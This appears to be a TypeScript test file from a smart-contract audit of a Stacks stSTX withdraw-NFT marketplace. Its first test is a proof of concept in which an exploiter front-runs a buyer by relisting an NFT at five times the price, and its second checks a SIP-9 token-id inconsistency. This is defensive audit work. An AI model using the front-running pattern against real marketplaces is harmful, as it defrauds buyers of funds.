import { beforeEach, describe, expect, it } from "vitest";

import { standardPrincipalCV } from "@stacks/transactions";

import initChain from "../helpers/init";
import { Contracts, ExtendedSimnet } from "../helpers/interfaces";


describe("ststx-withdraw-nft", () => {
    let chain: ExtendedSimnet;
    let contracts: Contracts;
    let deployer: string;
    let wallets: Map<string, string>;

    beforeEach(async () => {
        ({ chain, deployer, wallets, contracts } = await initChain());
    }); // todo SWAP ALL STRING CONTRACT NAMES TO USING THE CONTRACT IMPLEMENTATION CONSTANTS

    it("ISSUE: Race condition when buying a withdraw NFT", async () => {
        const DEPOSIT_AMOUNT: bigint = 1n * (10n ** 6n);
        const EXPLOITER: string = deployer;
        const USER_2: string = wallets.get("wallet_2")!;

        // @audit Stacking initial STX amount
        expect(
            contracts.core.deposit(
                contracts.reserve.name,
                "commission-v2",
                "staking-v1",
                "direct-helpers-v1",
                DEPOSIT_AMOUNT,
                undefined,
                undefined,
                EXPLOITER
            )
        ).toBe(true);

        // @audit Creating an unstack NFT for our whole balance
        expect(
            contracts.core.initWithdraw(
                contracts.reserve.name,
                "direct-helpers-v1",
                contracts.reserve.getSTXBalance(),
                EXPLOITER
            )
        ).toBe(true);

        // @audit Listing the NFT for sale
        expect(
            contracts.stSTXWithdrawNFT.listInUSTX(
                contracts.stSTXWithdrawNFT.getLastTokenId() - 1n, // @audit Last minted token(0th index)
                (DEPOSIT_AMOUNT - (DEPOSIT_AMOUNT * 5n / 100n)),
                "marketplace-commission",
                EXPLOITER
            )
        ).toBe(true);

        const BALANCE_BEFORE_FRAUDULENT_LISTING_BUY: bigint = chain.getBalance("STX", USER_2);

        // @audit FRONTRUNNING `USER_2`'s `buyInUSTX` transaction: (txs are not in the same block here for the sake of simplicity)
        expect(
            contracts.stSTXWithdrawNFT.listInUSTX(
                contracts.stSTXWithdrawNFT.getLastTokenId() - 1n, // @audit Last minted token(0th index)
                DEPOSIT_AMOUNT * 5n,
                "marketplace-commission",
                EXPLOITER
            )
        ).toBe(true);

        expect(
            contracts.stSTXWithdrawNFT.buyInUSTX(
                contracts.stSTXWithdrawNFT.getLastTokenId() - 1n,
                "marketplace-commission",
                USER_2
            )
        ).toBe(true);

        const BALANCE_AFTER_FRAUDULENT_LISTING_BUY: bigint = chain.getBalance("STX", USER_2);
        
        const DIFF: bigint = 
            (
                (BALANCE_BEFORE_FRAUDULENT_LISTING_BUY - BALANCE_AFTER_FRAUDULENT_LISTING_BUY)
                - DEPOSIT_AMOUNT
            ) / (10n ** 6n);

        console.log(`USER_2 paid difference: ${DIFF} STX`);
    });

    it("ISSUE: SIP-9 `get-last-token-id` inconsistency", async () => { 
        // https://book.clarity-lang.org/ch10-01-sip009-nft-standard.html
        // `get-last-token-id` section

        const DEPOSIT_AMOUNT: bigint = 1n * (10n ** 6n);

        // @audit Stacking initial STX amount
        expect(
            contracts.core.deposit(
                contracts.reserve.name,
                "commission-v2",
                "staking-v1",
                "direct-helpers-v1",
                DEPOSIT_AMOUNT
            )
        ).toBe(true);

        // @audit Creating an unstack NFT for our whole balance
        expect(
            contracts.core.initWithdraw(
                contracts.reserve.name,
                "direct-helpers-v1",
                contracts.reserve.getSTXBalance()
            )
        ).toBe(true);

        expect(
            contracts.stSTXWithdrawNFT.getOwner(
                contracts.stSTXWithdrawNFT.getLastTokenId() - 1n
            )
        ).toStrictEqual(standardPrincipalCV(deployer));
    });
});